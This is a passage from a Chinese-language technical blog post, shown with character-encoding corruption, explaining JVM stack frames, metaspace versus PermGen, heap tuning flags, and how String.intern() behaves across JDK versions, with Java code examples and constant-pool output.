ˆå¸§åŒ…å«ï¼šæœ¬åœ°å˜é‡è¡¨ã€æ“ä½œæ•°æ ˆã€è¿”å›åœ°å€ç­‰</p></li><li><p>è™šæ‹Ÿæœºæä¾›å‚æ•°**-Xss**æ¥æŒ‡å®šçº¿ç¨‹çš„æœ€å¤§æ ˆç©ºé—´ï¼Œå†³å®šäº†å‡½æ•°è°ƒç”¨çš„æœ€å¤§æ·±åº¦ã€‚</p></li></ul><p>Java è™šæ‹Ÿæœºæ ˆä¼šå‡ºç°ä¸¤ç§å¼‚å¸¸ï¼šStackOverFlowError å’Œ OutOfMemoryErrorã€‚</p><ul><li>StackOverFlowError è‹¥ Java è™šæ‹Ÿæœºæ ˆçš„å¤§å°ä¸å…è®¸åŠ¨æ€æ‰©å±•ï¼Œé‚£ä¹ˆå½“çº¿ç¨‹è¯·æ±‚æ ˆçš„æ·±åº¦è¶…è¿‡å½“å‰ Java è™šæ‹Ÿæœºæ ˆçš„æœ€å¤§æ·±åº¦æ—¶ï¼ŒæŠ›å‡º StackOverFlowError å¼‚å¸¸ã€‚</li><li>OutOfMemoryError è‹¥å…è®¸åŠ¨æ€æ‰©å±•ï¼Œé‚£ä¹ˆå½“çº¿ç¨‹è¯·æ±‚æ ˆæ—¶å†…å­˜ç”¨å®Œäº†ï¼Œæ— æ³•å†åŠ¨æ€æ‰©å±•æ—¶ï¼ŒæŠ›å‡º OutOfMemoryError å¼‚å¸¸ã€‚</li></ul><p> <img src="/2020/03/29/JVM/image-20200329112911648.png"></p><p>  <img src="/2020/03/29/JVM/image-20200329113050542.png"></p><p> <img src="/2020/03/29/JVM/image-20200329113102131.png"></p><p> <img src="/2020/03/29/JVM/image-20200329113112976.png"></p><p> <img src="/2020/03/29/JVM/image-20200329113122285.png"></p><p>Iconst_0 æ˜¯å°†intå€¼0å‹å…¥æ“ä½œæ ˆä¸­ï¼Œ</p><p>Istone_2 æ˜¯å°†æ“ä½œæ•°æ ˆé¡¶çš„å…ƒç´ (0)popå‡ºæ¥ï¼Œå­˜å…¥å±€éƒ¨å˜é‡è¡¨çš„ç¬¬2ä¸ªï¼ˆ0,1,2ï¼‰ä½ç½®ä¸­</p><p>Iload_0 å°†å±€éƒ¨å˜é‡è¡¨çš„ç¬¬0ä¸ªå…ƒç´ å‹å…¥æ“ä½œæ•°æ ˆä¸­</p><p>Iload_1 å°†å±€éƒ¨å˜é‡è¡¨çš„ç¬¬1ä¸ªå…ƒç´ å‹å…¥æ“ä½œæ•°æ ˆä¸­ï¼Œç”±äºæ˜¯æ ˆï¼Œæ‰€ä»¥2åœ¨1çš„ä¸Šé¢ã€‚</p><p>Iadd å°†æ“ä½œæ•°æ ˆçš„å…ƒç´ å¼¹å‡ºï¼Œç„¶åç›¸åŠ åå‹å…¥æ ˆé¡¶</p><p>Istore2 å°±æ˜¯å°†æ ˆé¡¶çš„å…ƒç´ å¼¹å‡ºæ”¾å…¥å±€éƒ¨å˜é‡è¡¨ç¬¬2ä¸ªä½ç½®ä¸­</p><p>iload_2 å°†å±€éƒ¨å˜é‡ä¸­ç¬¬2ä¸ªå…ƒç´ å‹å…¥æ“ä½œæ•°æ ˆ </p><p>ireturn è¿”å›æ“ä½œæ•°æ ˆé¡¶å…ƒç´ ã€‚</p><p>è¿”å›åæ‰€æœ‰æ ˆå¸§é”€æ¯</p><p><font color="red">æ ˆçš„å†…å­˜ä¸éœ€è¦GCå›æ”¶ï¼Œè‡ªåŠ¨é”€æ¯ï¼ˆè¿è¡Œå®Œå°±å›æ”¶äº†ï¼‰ã€‚</font></p><p> <img src="/2020/03/29/JVM/image-20200329113455603.png"></p><h5><span id="é€’å½’ä¸ºä»€ä¹ˆä¼šå¼•å‘javalangstackoverflowerrorå¼‚å¸¸">é€’å½’ä¸ºä»€ä¹ˆä¼šå¼•å‘java.lang.StackOverflowErrorå¼‚å¸¸</span></h5><p>æ ˆå¸§æ•°è¶…è¿‡è™šæ‹Ÿæœºæ ˆæ·±åº¦</p><p> <img src="/2020/03/29/JVM/image-20200329113511734.png"></p><p><img src="/2020/03/29/JVM/image-20200329113520222.png"></p><h4><span id="æœ¬åœ°æ–¹æ³•æ ˆ">æœ¬åœ°æ–¹æ³•æ ˆ</span></h4><p>Ã˜ ä¸è™šæ‹Ÿæœºæ ˆç›¸ä¼¼ï¼Œä¸»è¦ä½œç”¨äºæ ‡æ³¨äº†nativeçš„æ–¹æ³•</p><h4><span id="å…ƒç©ºé—´ä¸æ°¸ä¹…ä»£">å…ƒç©ºé—´ä¸æ°¸ä¹…ä»£</span></h4><p>å®ƒä»¬éƒ½æ˜¯Javaæ–¹æ³•åŒºçš„å®ç°</p><p>å…ƒç©ºé—´ä½¿ç”¨æœ¬åœ°å†…å­˜ï¼Œæ°¸ä¹…ä»£ä½¿ç”¨çš„æ˜¯jvmå†…å­˜ </p><p><img src="/2020/03/29/JVM/image-20200329113534717.png"></p><h5><span id="metaspaceç›¸æ¯”permgençš„ä¼˜åŠ¿">MetaSpaceç›¸æ¯”PermGençš„ä¼˜åŠ¿</span></h5><p>Ã˜ å­—ç¬¦ä¸²å¸¸é‡æ± å­˜åœ¨æ°¸ä¹…ä»£ä¸­ï¼Œå®¹æ˜“å‡ºç°æ€§èƒ½é—®é¢˜å’Œå†…å­˜æº¢å‡º</p><p>Ã˜ ç±»å’Œæ–¹æ³•çš„ä¿¡æ¯å¤§å°éš¾ä»¥ç¡®å®šï¼Œç»™æ°¸ä¹…ä»£çš„å¤§å°æŒ‡å®šå¸¦æ¥å›°éš¾</p><p>Ã˜ æ°¸ä¹…ä»£ä¼šä¸ºGCå¸¦æ¥ä¸å¿…è¦çš„å¤æ‚æ€§ï¼ˆæ°¸ä¹…ä»£åœ¨å †ä¸­ï¼‰</p><p>Ã˜ æ–¹ä¾¿HotSpotä¸å…¶ä»–JVMå¦‚Jrockitçš„é›†æˆ</p><h4><span id="javaå †heap">Javaå †ï¼ˆHeapï¼‰</span></h4><p><img src="/2020/03/29/JVM/image-20200329113548468.png"></p><h4><span id="javaä¸‰å¤§æ€§èƒ½è°ƒä¼˜å‚æ•°-xms-xmx-xssçš„å«ä¹‰">Javaä¸‰å¤§æ€§èƒ½è°ƒä¼˜å‚æ•°-Xms â€“Xmx â€“Xssçš„å«ä¹‰</span></h4><p>Ã˜ -Xssï¼šè§„å®šäº†æ¯ä¸ªçº¿ç¨‹è™šæ‹Ÿæœºæ ˆï¼ˆå †æ ˆï¼‰çš„å¤§å°</p><p>Ã˜ -Xmsï¼šå †çš„åˆå§‹å€¼</p><p>Ã˜ -Xmxï¼šå †èƒ½è¾¾åˆ°çš„æœ€å¤§å€¼</p><p>ä¸€èˆ¬ä¼šè®©-Xms&#x3D;-Xmxå› ä¸ºï¼Œå½“heapä¸å¤Ÿç”¨è€Œå‘ç”Ÿæ‰©å®¹æ—¶ä¼šå‘ç”Ÿå†…å­˜æŠ–åŠ¨ï¼Œå½±å“ç¨‹åºè¿è¡Œæ—¶çš„ç¨³å®šæ€§ã€‚</p><h4><span id="javaå†…å­˜æ¨¡å‹ä¸­å †å’Œæ ˆçš„åŒºåˆ«-å†…å­˜åˆ†é…ç­–ç•¥-">Javaå†…å­˜æ¨¡å‹ä¸­å †å’Œæ ˆçš„åŒºåˆ«-å†…å­˜åˆ†é…ç­–ç•¥ã€-ã€‘</span></h4><p>Ã˜ é™æ€å­˜å‚¨ï¼šç¼–è¯‘æ—¶ç¡®å®šæ¯ä¸ªæ•°æ®ç›®æ ‡åœ¨è¿è¡Œæ—¶çš„å­˜å‚¨ç©ºé—´éœ€æ±‚</p><p>Ã˜ æ ˆå¼å­˜å‚¨ï¼šæ•°æ®åŒºéœ€æ±‚åœ¨ç¼–è¯‘æ—¶æœªçŸ¥ï¼Œè¿è¡Œæ—¶æ¨¡å—å…¥å£å‰ç¡®å®š</p><p>Ã˜ å †å¼å­˜å‚¨ï¼šç¼–è¯‘æ—¶æˆ–è¿è¡Œæ—¶æ¨¡å—å…¥å£éƒ½æ— æ³•ç¡®å®šï¼ŒåŠ¨æ€åˆ†é…</p><p>â€‹    <img src="/2020/03/29/JVM/image-20200329113633980.png">                   </p><p>Ã˜ ç®¡ç†æ–¹å¼ï¼šæ ˆè‡ªåŠ¨é‡Šæ”¾ï¼Œå †éœ€è¦GC</p><p>Ã˜ ç©ºé—´å¤§å°ï¼šæ ˆæ¯”å †å°</p><p>Ã˜ ç¢ç‰‡ç›¸å…³ï¼šæ ˆäº§ç”Ÿçš„ç¢ç‰‡è¿œå°äºå †</p><p>Ã˜ åˆ†é…æ–¹å¼ï¼šæ ˆæ”¯æŒé™æ€å’ŒåŠ¨æ€åˆ†é…ï¼Œè€Œå †ä»…æ”¯æŒåŠ¨æ€åˆ†é…</p><p>Ã˜ æ•ˆç‡ï¼šæ ˆçš„æ•ˆç‡æ¯”å †é«˜</p><h4><span id="å…ƒç©ºé—´-å †-çº¿ç¨‹ç‹¬å éƒ¨åˆ†é—´çš„è”ç³»-å†…å­˜è§’åº¦">å…ƒç©ºé—´ã€å †ã€çº¿ç¨‹ç‹¬å éƒ¨åˆ†é—´çš„è”ç³»-å†…å­˜è§’åº¦ã€ã€‘</span></h4><p><img src="/2020/03/29/JVM/image-20200329113803997.png"></p><p><img src="/2020/03/29/JVM/image-20200329113811855.png"></p><p><img src="/2020/03/29/JVM/image-20200329113830564.png"></p><p><img src="/2020/03/29/JVM/image-20200329113837079.png"></p><p><img src="/2020/03/29/JVM/image-20200329113848685.png"></p><h4><span id="ä¸åŒjdkç‰ˆæœ¬é—´internæ–¹æ³•çš„åŒºåˆ«">ä¸åŒJDKç‰ˆæœ¬é—´intern()æ–¹æ³•çš„åŒºåˆ«</span></h4><p><img src="/2020/03/29/JVM/image-20200329113858806.png"></p><p><img src="/2020/03/29/JVM/image-20200329113905280.png"></p><p><img src="/2020/03/29/JVM/image-20200329113918059.png"></p><p><strong>JDK8ä¸­</strong></p><p>False</p><p>True</p><p><strong>JDK6ä¸­ï¼š</strong></p><p>FALSE</p><p>FALSE</p><p><img src="/2020/03/29/JVM/image-20200329113929389.png"></p><p>åœ¨JDK1.6ä¸­æ‰€æœ‰çš„è¾“å‡ºç»“æœéƒ½æ˜¯ falseï¼Œå› ä¸ºJDK1.6ä»¥åŠä»¥å‰ç‰ˆæœ¬ä¸­ï¼Œå¸¸é‡æ± æ˜¯æ”¾åœ¨ Perm åŒºï¼ˆå±äºæ–¹æ³•åŒºï¼‰ä¸­çš„ï¼Œç†Ÿæ‚‰JVMçš„è¯åº”è¯¥çŸ¥é“è¿™æ˜¯å’Œå †åŒºå®Œå…¨åˆ†å¼€çš„ã€‚</p><p>ä½¿ç”¨<font color="red">å¼•å·å£°æ˜çš„å­—ç¬¦ä¸²éƒ½æ˜¯ä¼šç›´æ¥åœ¨å­—ç¬¦ä¸²å¸¸é‡æ± </font>ä¸­ç”Ÿæˆçš„ï¼Œè€Œ new å‡ºæ¥çš„ String å¯¹è±¡æ˜¯æ”¾åœ¨å †ç©ºé—´ä¸­çš„ã€‚æ‰€ä»¥ä¸¤è€…çš„å†…å­˜åœ°å€è‚¯å®šæ˜¯ä¸ç›¸åŒçš„ï¼Œå³ä½¿è°ƒç”¨äº†intern()æ–¹æ³•ä¹Ÿæ˜¯ä¸å½±å“çš„ã€‚å¦‚æœä¸æ¸…æ¥šStringç±»çš„â€œ&#x3D;&#x3D;â€å’Œequals()çš„åŒºåˆ«å¯ä»¥æŸ¥çœ‹æˆ‘çš„è¿™ç¯‡åšæ–‡Javaé¢è¯•â€”â€”ä»Javaå †ã€æ ˆè§’åº¦æ¯”è¾ƒequalså’Œ&#x3D;&#x3D;çš„åŒºåˆ«ã€‚</p><p>intern()æ–¹æ³•åœ¨JDK1.6ä¸­çš„ä½œç”¨æ˜¯ï¼šæ¯”å¦‚String s &#x3D; new String(â€œSEU_Calvinâ€)ï¼Œå†è°ƒç”¨s.intern()ï¼Œæ­¤æ—¶è¿”å›å€¼è¿˜æ˜¯å­—ç¬¦ä¸²â€SEU_Calvinâ€ï¼Œè¡¨é¢ä¸Šçœ‹èµ·æ¥å¥½åƒè¿™ä¸ªæ–¹æ³•æ²¡ä»€ä¹ˆç”¨å¤„ã€‚ä½†å®é™…ä¸Šï¼Œåœ¨JDK1.6ä¸­å®ƒåšäº†ä¸ªå°åŠ¨ä½œï¼šæ£€æŸ¥å­—ç¬¦ä¸²æ± é‡Œæ˜¯å¦å­˜åœ¨â€SEU_Calvinâ€è¿™ä¹ˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå¦‚æœå­˜åœ¨ï¼Œå°±è¿”å›æ± é‡Œçš„å­—ç¬¦ä¸²ï¼›å¦‚æœä¸å­˜åœ¨ï¼Œè¯¥æ–¹æ³•ä¼šæŠŠâ€SEU_Calvinâ€æ·»åŠ åˆ°å­—ç¬¦ä¸²æ± ä¸­ï¼Œç„¶åå†è¿”å›å®ƒçš„å¼•ç”¨ã€‚ç„¶è€Œåœ¨JDK1.7ä¸­å´ä¸æ˜¯è¿™æ ·çš„ï¼Œåé¢ä¼šè®¨è®ºã€‚</p><p>ä¸‹é¢ä»£ç </p><p>ä¸¤ä¸ªnew stringå°±ä¼šåœ¨heapä¸­ç”Ÿæˆä¸€ä¸ªaaï¼Œç„¶åinternå°†aaçš„å‰¯æœ¬æ”¾å…¥å¸¸é‡æ± ä¸­ï¼Œç”±äºæ˜¯å‰¯æœ¬æ‰€ä»¥æŒ‡é’ˆä¹Ÿä¸ä¸€æ ·ï¼Œå› æ­¤è¿˜æ˜¯falseï¼›</p><p><strong>JDK1.7ä»¥ä¸Š</strong></p><p><img src="/2020/03/29/JVM/image-20200329113945392.png"></p><p>String s &#x3D; newString(â€œ1â€)ï¼Œç”Ÿæˆäº†å¸¸é‡æ± ä¸­çš„â€œ1â€ å’Œå †ç©ºé—´ä¸­çš„å­—ç¬¦ä¸²å¯¹è±¡ã€‚</p><p>s.intern()ï¼Œè¿™ä¸€è¡Œçš„ä½œç”¨æ˜¯så¯¹è±¡å»å¸¸é‡æ± ä¸­å¯»æ‰¾åå‘ç°â€1â€å·²ç»å­˜åœ¨äºå¸¸é‡æ± ä¸­äº†ã€‚</p><p>String s2 &#x3D; â€œ1â€ï¼Œè¿™è¡Œä»£ç æ˜¯ç”Ÿæˆä¸€ä¸ªs2çš„å¼•ç”¨æŒ‡å‘å¸¸é‡æ± ä¸­çš„â€œ1â€å¯¹è±¡ã€‚</p><p>ç»“æœå°±æ˜¯ s å’Œ s2 çš„å¼•ç”¨åœ°å€æ˜æ˜¾ä¸åŒã€‚å› æ­¤è¿”å›äº†falseã€‚</p><p>String s3 &#x3D; new String(â€œ1â€) + newString(â€œ1â€)ï¼Œè¿™è¡Œä»£ç åœ¨å­—ç¬¦ä¸²å¸¸é‡æ± ä¸­ç”Ÿæˆâ€œ1â€ ï¼Œå¹¶åœ¨å †ç©ºé—´ä¸­ç”Ÿæˆs3å¼•ç”¨æŒ‡å‘çš„å¯¹è±¡ï¼ˆå†…å®¹ä¸ºâ€11â€ï¼‰ã€‚æ³¨æ„æ­¤æ—¶å¸¸é‡æ± ä¸­æ˜¯æ²¡æœ‰ â€œ11â€å¯¹è±¡çš„ã€‚</p><p>s3.intern()ï¼Œè¿™ä¸€è¡Œä»£ç ï¼Œæ˜¯å°† s3ä¸­çš„â€œ11â€å­—ç¬¦ä¸²æ”¾å…¥ String å¸¸é‡æ± ä¸­ï¼Œæ­¤æ—¶å¸¸é‡æ± ä¸­ä¸å­˜åœ¨â€œ11â€å­—ç¬¦ä¸²ï¼ŒJDK1.6çš„åšæ³•æ˜¯ç›´æ¥åœ¨å¸¸é‡æ± ä¸­ç”Ÿæˆä¸€ä¸ª â€œ11â€ çš„å¯¹è±¡ã€‚</p><p><font color="red">ä½†æ˜¯åœ¨JDK1.7ä¸­ï¼Œå¸¸é‡æ± ä¸­ä¸éœ€è¦å†å­˜å‚¨ä¸€ä»½å¯¹è±¡äº†ï¼Œå¯ä»¥ç›´æ¥å­˜å‚¨å †ä¸­çš„å¼•ç”¨ã€‚è¿™ä»½å¼•ç”¨ç›´æ¥æŒ‡å‘ s3 å¼•ç”¨çš„å¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯è¯´s3.intern() &#x3D;&#x3D;s3ä¼šè¿”å›trueã€‚</font>&gt;</p><p>String s4 &#x3D; â€œ11â€ï¼Œ è¿™ä¸€è¡Œä»£ç ä¼šç›´æ¥å»å¸¸é‡æ± ä¸­åˆ›å»ºï¼Œä½†æ˜¯å‘ç°å·²ç»æœ‰è¿™ä¸ªå¯¹è±¡äº†ï¼Œæ­¤æ—¶ä¹Ÿå°±æ˜¯æŒ‡å‘ s3 å¼•ç”¨å¯¹è±¡çš„ä¸€ä¸ªå¼•ç”¨ã€‚å› æ­¤s3 &#x3D;&#x3D; s4è¿”å›äº†trueã€‚</p><p> çœ‹ä¾‹1ï¼š<br>  String s0&#x3D;â€kvillâ€;<br>  String s1&#x3D;â€kvillâ€;<br>  String s2&#x3D;â€kvâ€ + â€œillâ€;<br>  System.out.println( s0&#x3D;&#x3D;s1 );<br>  System.out.println( s0&#x3D;&#x3D;s2 );<br>  ç»“æœä¸ºï¼š<br>  true<br>  true</p><p> çœ‹ä¾‹2ï¼š</p><p>  String s0&#x3D;â€kvillâ€;</p><p>  String s1&#x3D;new String(â€kvillâ€);</p><p>  String s2&#x3D;â€kvâ€ + new String(â€œillâ€);</p><p>  System.out.println( s0&#x3D;&#x3D;s1 );</p><p>  System.out.println( s0&#x3D;&#x3D;s2 );</p><p>  System.out.println( s1&#x3D;&#x3D;s2 );</p><p>  ç»“æœä¸ºï¼š</p><p>  false</p><p>  false</p><p>  false</p><p>  ä¾‹2ä¸­s0è¿˜æ˜¯å¸¸é‡æ± ä¸­â€kvillâ€çš„åº”ç”¨ï¼Œs1å› ä¸ºæ— æ³•åœ¨ç¼–è¯‘æœŸç¡®å®šï¼Œæ‰€ä»¥æ˜¯è¿è¡Œæ—¶åˆ›å»ºçš„æ–°å¯¹è±¡â€kvillâ€çš„å¼•ç”¨ï¼Œs2å› ä¸ºæœ‰ååŠéƒ¨åˆ†new String(â€œillâ€)æ‰€ä»¥ä¹Ÿæ— æ³•åœ¨ç¼–è¯‘æœŸç¡®å®šï¼Œæ‰€ä»¥ä¹Ÿæ˜¯ä¸€ä¸ªæ–°åˆ›å»ºå¯¹è±¡â€kvillâ€çš„åº”ç”¨;æ˜ç™½äº†è¿™äº›ä¹Ÿå°±çŸ¥é“ä¸ºä½•å¾—å‡ºæ­¤ç»“æœäº†ã€‚</p><p><strong>ä¾‹å¦‚ï¼š</strong></p><p>String str1&#x3D;â€ABCâ€ï¼› å’ŒString str2 &#x3D; new String(â€œABCâ€); </p><p><strong>String str1&#x3D;â€ABCâ€</strong> <strong>å¯èƒ½åˆ›å»ºä¸€ä¸ªå¯¹è±¡æˆ–è€…ä¸åˆ›å»ºå¯¹è±¡ï¼Œå¦‚æœâ€ABCâ€è¿™ä¸ªå­—ç¬¦ä¸²åœ¨</strong>JavaString<strong>æ± é‡Œä¸å­˜åœ¨ï¼Œä¼šåœ¨</strong>JavaStringæ± åˆ›å»ºè¿™ä¸ªä¸€ä¸ªStringå¯¹è±¡(â€œABCâ€).å¦‚æœå·²ç»å­˜åœ¨ï¼Œstr1ç›´æ¥reference toè¿™ä¸ªStringæ± é‡Œçš„å¯¹è±¡ã€‚<strong>String str2 &#x3D; new String(â€œABCâ€)</strong> è‡³å°‘åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œä¹Ÿå¯èƒ½ä¸¤ä¸ªã€‚å› ä¸ºç”¨åˆ°newå…³é”®å­—ï¼Œä¼šåœ¨heapåˆ›å»ºä¸€ä¸ª <strong>str2</strong> çš„String <strong>å¯¹è±¡ï¼Œå®ƒçš„</strong>value <strong>æ˜¯</strong> **â€ABCâ€.***åŒæ—¶ï¼Œå¦‚æœâ€ABCâ€è¿™ä¸ªå­—ç¬¦ä¸²åœ¨java Stringæ± é‡Œä¸å­˜åœ¨ï¼Œä¼šåœ¨java Stringæ± åˆ›å»ºè¿™ä¸ªä¸€ä¸ªStringå¯¹è±¡(â€œABCâ€).</p><h2><span id="å¼•å…¥">å¼•å…¥</span></h2><p>Stringï¼Œæ˜¯ Java ä¸­é™¤äº†åŸºæœ¬æ•°æ®ç±»å‹ä»¥å¤–ï¼Œæœ€ä¸ºé‡è¦çš„ä¸€ä¸ªç±»å‹äº†ã€‚å¾ˆå¤šäººä¼šè®¤ä¸ºä»–æ¯”è¾ƒç®€å•ã€‚ä½†æ˜¯å’Œ String æœ‰å…³çš„é¢è¯•é¢˜æœ‰å¾ˆå¤šï¼Œä¸‹é¢æˆ‘éšä¾¿æ‰¾ä¸¤é“é¢è¯•é¢˜ï¼Œçœ‹çœ‹ä½ èƒ½ä¸èƒ½éƒ½ç­”å¯¹ï¼š</p><p> Q1ï¼š<code>String s = new String(&quot;hollis&quot;);</code>å®šä¹‰äº†å‡ ä¸ªå¯¹è±¡ã€‚<br> Q2ï¼šå¦‚ä½•ç†è§£ <code>String.intern()</code>æ–¹æ³•ï¼Ÿ<br> ä¸Šé¢è¿™ä¸¤ä¸ªæ˜¯é¢è¯•é¢˜å’Œ String ç›¸å…³çš„æ¯”è¾ƒå¸¸è€ƒçš„ï¼Œå¾ˆå¤šäººä¸€èˆ¬éƒ½çŸ¥é“ç­”æ¡ˆã€‚</p><p> A1ï¼šè‹¥å¸¸é‡æ± ä¸­å·²ç»å­˜åœ¨ â€œhollisâ€ï¼Œåˆ™ç›´æ¥å¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯æ­¤æ—¶åªä¼šåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œå¦‚æœå¸¸é‡æ± ä¸­ä¸å­˜åœ¨ â€œhollisâ€ï¼Œåˆ™å…ˆåˆ›å»ºåå¼•ç”¨ï¼Œä¹Ÿå°±æ˜¯æœ‰ä¸¤ä¸ªã€‚<br> A2ï¼šå½“ä¸€ä¸ª String å®ä¾‹è°ƒç”¨intern()æ–¹æ³•æ—¶ï¼ŒJVM ä¼šæŸ¥æ‰¾å¸¸é‡æ± ä¸­æ˜¯å¦æœ‰ç›¸åŒ Unicode çš„å­—ç¬¦ä¸²å¸¸é‡ï¼Œå¦‚æœæœ‰ï¼Œåˆ™è¿”å›å…¶çš„å¼•ç”¨ï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™åœ¨å¸¸é‡æ± ä¸­å¢åŠ ä¸€ä¸ª Unicode ç­‰äº str çš„å­—ç¬¦ä¸²å¹¶è¿”å›å®ƒçš„å¼•ç”¨ï¼›<br> ä¸¤ä¸ªç­”æ¡ˆçœ‹ä¸Šå»æ²¡æœ‰ä»»ä½•é—®é¢˜ï¼Œä½†æ˜¯ï¼Œä»”ç»†æƒ³æƒ³å¥½åƒå“ªé‡Œä¸å¯¹å‘€ã€‚</p><p>æŒ‰ç…§ä¸Šé¢çš„ä¸¤ä¸ªé¢è¯•é¢˜çš„å›ç­”ï¼Œå°±æ˜¯è¯´ new String ä¼šæ£€æŸ¥å¸¸é‡æ± ï¼Œå¦‚æœæœ‰çš„è¯å°±ç›´æ¥å¼•ç”¨ï¼Œå¦‚æœä¸å­˜åœ¨å°±è¦åœ¨å¸¸é‡æ± åˆ›å»ºä¸€ä¸ªï¼Œé‚£ä¹ˆè¿˜è¦ intern å¹²å•¥ï¼Ÿéš¾é“ä»¥ä¸‹ä»£ç æ˜¯æ²¡æœ‰æ„ä¹‰çš„å—ï¼Ÿ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hollis&quot;</span>).intern();        <span class="number">1</span></span><br></pre></td></tr></table></figure><p>å¦‚æœï¼Œæ¯å½“æˆ‘ä»¬ä½¿ç”¨ new åˆ›å»ºå­—ç¬¦ä¸²çš„æ—¶å€™ï¼Œéƒ½ä¼šåˆ°å­—ç¬¦ä¸²æ± æ£€æŸ¥ï¼Œç„¶åè¿”å›ã€‚é‚£ä¹ˆä»¥ä¸‹ä»£ç ä¹Ÿåº”è¯¥è¾“å‡ºç»“æœéƒ½æ˜¯ true?</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s1</span> <span class="operator">=</span> <span class="string">&quot;Hollis&quot;</span>;</span><br><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hollis&quot;</span>);</span><br><span class="line"><span class="type">String</span> <span class="variable">s3</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hollis&quot;</span>).intern();</span><br><span class="line"></span><br><span class="line">System.out.println(s1 == s2);</span><br><span class="line">System.out.println(s1 == s3);</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ï¼Œä»¥ä¸Šä»£ç è¾“å‡ºç»“æœä¸ºï¼ˆbase jdk1.8.0_73ï¼‰ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">false</span><br><span class="line">true</span><br></pre></td></tr></table></figure><p>ä¸çŸ¥é“èªæ˜çš„è¯»è€…çœ‹å®Œè¿™æ®µä»£ç ä¹‹åï¼Œæ˜¯ä¸æ˜¯æœ‰ç‚¹è¢«æè’™äº†ï¼Œåˆ°åº•æ˜¯æ€ä¹ˆå›äº‹å„¿ï¼Ÿ</p><p>åˆ«æ€¥ï¼Œä¸”å¬æˆ‘æ…¢æ…¢é“æ¥ã€‚</p><h2><span id="å­—é¢é‡å’Œè¿è¡Œæ—¶å¸¸é‡æ± ">å­—é¢é‡å’Œè¿è¡Œæ—¶å¸¸é‡æ± </span></h2><p>JVM ä¸ºäº†æé«˜æ€§èƒ½å’Œå‡å°‘å†…å­˜å¼€é”€ï¼Œåœ¨å®ä¾‹åŒ–å­—ç¬¦ä¸²å¸¸é‡çš„æ—¶å€™è¿›è¡Œäº†ä¸€äº›ä¼˜åŒ–ã€‚ä¸ºäº†å‡å°‘åœ¨ JVM ä¸­åˆ›å»ºçš„å­—ç¬¦ä¸²çš„æ•°é‡ï¼Œå­—ç¬¦ä¸²ç±»ç»´æŠ¤äº†ä¸€ä¸ªå­—ç¬¦ä¸²å¸¸é‡æ± ã€‚</p><p>åœ¨ JVM è¿è¡Œæ—¶åŒºåŸŸçš„æ–¹æ³•åŒºä¸­ï¼Œæœ‰ä¸€å—åŒºåŸŸæ˜¯è¿è¡Œæ—¶å¸¸é‡æ± ï¼Œä¸»è¦ç”¨æ¥å­˜å‚¨ç¼–è¯‘æœŸç”Ÿæˆçš„å„ç§å­—é¢é‡å’Œç¬¦å·å¼•ç”¨ã€‚</p><p>äº†è§£ Class æ–‡ä»¶ç»“æ„æˆ–è€…åšè¿‡ Java ä»£ç çš„åç¼–è¯‘çš„æœ‹å‹å¯èƒ½éƒ½çŸ¥é“ï¼Œåœ¨ java ä»£ç è¢« javac ç¼–è¯‘ä¹‹åï¼Œæ–‡ä»¶ç»“æ„ä¸­æ˜¯åŒ…å«ä¸€éƒ¨åˆ† Constant pool çš„ã€‚æ¯”å¦‚ä»¥ä¸‹ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;Hollis&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç»è¿‡ç¼–è¯‘åï¼Œå¸¸é‡æ± å†…å®¹å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Constant pool:</span><br><span class="line">#<span class="number">1</span> = Methodref          #<span class="number">4.</span>#<span class="number">20</span>         <span class="comment">// java/lang/Object.&quot;&lt;init&gt;&quot;:()V</span></span><br><span class="line">#<span class="number">2</span> = String             #<span class="number">21</span>            <span class="comment">// Hollis</span></span><br><span class="line">#<span class="number">3</span> = Class              #<span class="number">22</span>            <span class="comment">// StringDemo</span></span><br><span class="line">#<span class="number">4</span> = Class              #<span class="number">23</span>            <span class="comment">// java/lang/Object</span></span><br><span class="line">...</span><br><span class="line">#<span class="number">16</span> = Utf8               s</span><br><span class="line">..</span><br><span class="line">#<span class="number">21</span> = Utf8               Hollis</span><br><span class="line">#<span class="number">22</span> = Utf8               StringDemo</span><br><span class="line">#<span class="number">23</span> = Utf8               java/lang/Object</span><br></pre></td></tr></table></figure><p>ä¸Šé¢çš„ Class æ–‡ä»¶ä¸­çš„å¸¸é‡æ± ä¸­ï¼Œæ¯”è¾ƒé‡è¦çš„å‡ ä¸ªå†…å®¹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td 